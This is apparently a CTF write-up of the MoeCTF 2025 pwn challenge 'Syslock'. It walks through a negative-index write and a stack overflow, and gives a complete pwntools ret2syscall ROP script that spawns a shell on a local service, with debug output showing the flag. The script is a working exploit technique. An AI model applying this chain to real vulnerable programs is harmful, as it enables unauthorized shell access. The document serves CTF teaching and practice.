---
title: 'XiDianCTF MoeCTF 2025 PWN Syslock'
date: '2026-09-05T14:45:01+08:00'
lastmod: '2026-09-05T14:45:01+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
The original Chinese article was written by a human and only proofread with generative AI. This English version was translated with AI.
```

[Challenge link](https://ctf.xidian.edu.cn/training/22?challenge=894)

> Based on the challenge hint, this may be a ret2syscall[^ret2syscall] challenge.

As usual, open the binary in IDA.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  write(1, "My lock looks strange—can you help me?\n", 0x29uLL);
  write(1, "choose mode\n", 0xCuLL);
  i = input();
  if ( i > 4 )
    lose();
  write(1, "Input your password\n", 0x14uLL);
  read(0, (char *)&s + i, 0xCuLL);
  if ( i != 59 )
    lose();
  cheat();
  return 0;
}
```

> Notice that `i` is subject to two contradictory checks.
>
> We need to avoid branching to `lose()`:
>
> Observe:
>
> ```assembly
> s:0000000000404069                 align 20h
> .bss:0000000000404080                 public i
> .bss:0000000000404080 i               dd ?                    ; DATA XREF: main+4E↑w
> .bss:0000000000404080                                         ; main+54↑r ...
> .bss:0000000000404084                 align 20h
> .bss:00000000004040A0                 public s
> .bss:00000000004040A0 s               db    ? ;               ; DATA XREF: main+8A↑o
> .bss:00000000004040A1                 db    ? ;
> .bss:00000000004040A2                 db    ? ;
> .bss:00000000004040A3                 db    ? ;
> .bss:00000000004040A4                 db    ? ;
> .bss:00000000004040A5                 db    ? ;
> .bss:00000000004040A6                 db    ? ;
> .bss:00000000004040A7                 db    ? ;
> ```
>
> And note `read(0, (char *)&s + i, 0xCuLL);`.
>
> Therefore, we can set `i = 0x80 - 0xA0 = -0x20`.
>
> This lets us overwrite `i` and satisfy the later check.

```c
int input()
{
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  read(0, buf, 0xFuLL);
  buf[15] = 0;
  return atoi(buf);
}
```

`input()` itself cannot be exploited for a stack overflow.

```c
ssize_t cheat()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  write(1, "Developer Mode.\n", 0x10uLL);
  return read(0, buf, 0x100uLL);
}
```

However, `cheat()` can.



Taking a closer look reveals the following gadget:

```assembly
.text:000000000040123C ; void gadget()
.text:000000000040123C                 public gadget
.text:000000000040123C gadget          proc near
.text:000000000040123C ; __unwind {
.text:000000000040123C                 endbr64
.text:0000000000401240                 pop     rdi
.text:0000000000401241                 pop     rsi
.text:0000000000401242                 pop     rdx
.text:0000000000401243                 retn
.text:0000000000401243 gadget          endp ; sp-analysis failed
.text:0000000000401243
```

This `gadget()` is exceptionally useful: it provides three pops and a return in one sequence.



We still need a `/bin/sh` string, but none exists in the binary.

We can use the writable section identified earlier to inject the string while overwriting `i`.



We also need a `pop rax` gadget to set the syscall number, plus a `syscall` instruction.

Looking through the disassembly again, we find:

```assembly
0000000004011FD ; __unwind {
.text:00000000004011FD                 endbr64
.text:0000000000401201                 push    rbp
.text:0000000000401202                 mov     rbp, rsp
.text:0000000000401205                 sub     rsp, 10h
.text:0000000000401209                 lea     rax, aSomethingWrong ; "Something wrong.\n"
.text:0000000000401210                 mov     [rbp+buf], rax
.text:0000000000401214                 mov     rcx, [rbp+buf]
.text:0000000000401218                 mov     rax, 1
.text:000000000040121F                 mov     rdi, 1          ; fd
.text:0000000000401226                 mov     rsi, rcx        ; buf
.text:0000000000401229                 mov     rdx, 11h        ; count
.text:0000000000401230                 syscall                 ; LINUX - sys_write
.text:0000000000401232                 mov     edi, 0          ; status
.text:0000000000401237                 call    _exit
.text:0000000000401237 ; } // starts at 4011FD
.text:0000000000401237 lose            endp
```

This gives us a `syscall` instruction.

At this point, I used `ROPgadget` to search for the remaining gadget.

```
$ ROPgadget --bin ./pwn | grep "pop rax"
0x0000000000401244 : pop rax ; ret
```

That completes everything we need; the rest is a standard stack-overflow ROP chain.



Script:

```python
from pwn import *
import ctypes
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 51750)



io.recvuntil(b'mode')
io.sendline(b'-32')

io.recvuntil(b'password')
io.send(p32(59) + b'/bin/sh\x00')

io.recvuntil(b'Mode')
io.sendline(b'A' * 64 + b'A' * 8 + p64(0x401244) + p64(59) + p64(0x401240) + p64(0x404080 + 0x4) + p64(0) + p64(0) + p64(0x401230))

io.interactive()
```

> Without `io.recvuntil()`, the target may consume the second-stage overflow payload together with the first input, causing the exploit to fail.
> `read(0, (char *)&s + i, 0xCuLL);` reads exactly 12 bytes, matching the crafted string's length, so this must use `send()` rather than `sendline()`.



Output:

```
[x] Opening connection to 127.0.0.1 on port 51750
[x] Opening connection to 127.0.0.1 on port 51750: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 51750: Done
[DEBUG] Received 0x35 bytes:
    00000000  4d 79 20 6c  6f 63 6b 20  6c 6f 6f 6b  73 20 73 74  │My l│ock │look│s st│
    00000010  72 61 6e 67  65 e2 80 94  63 61 6e 20  79 6f 75 20  │rang│e···│can │you │
    00000020  68 65 6c 70  20 6d 65 3f  0a 63 68 6f  6f 73 65 20  │help│ me?│·cho│ose │
    00000030  6d 6f 64 65  0a                                     │mode│·│
    00000035
[DEBUG] Sent 0x4 bytes:
    b'-32\n'
[DEBUG] Received 0x14 bytes:
    b'Input your password\n'
[DEBUG] Sent 0xc bytes:
    00000000  3b 00 00 00  2f 62 69 6e  2f 73 68 00               │;···│/bin│/sh·│
    0000000c
[DEBUG] Received 0x10 bytes:
    b'Developer Mode.\n'
[DEBUG] Sent 0x80 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  44 12 40 00  00 00 00 00  │AAAA│AAAA│D·@·│····│
    00000050  3b 00 00 00  00 00 00 00  40 12 40 00  00 00 00 00  │;···│····│@·@·│····│
    00000060  84 40 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │·@@·│····│····│····│
    00000070  00 00 00 00  00 00 00 00  30 12 40 00  00 00 00 00  │····│····│0·@·│····│
    00000080
[*] Switching to interactive mode
.
cat flag
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 51750
```





















[^ret2syscall]:[ret2syscall](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall)
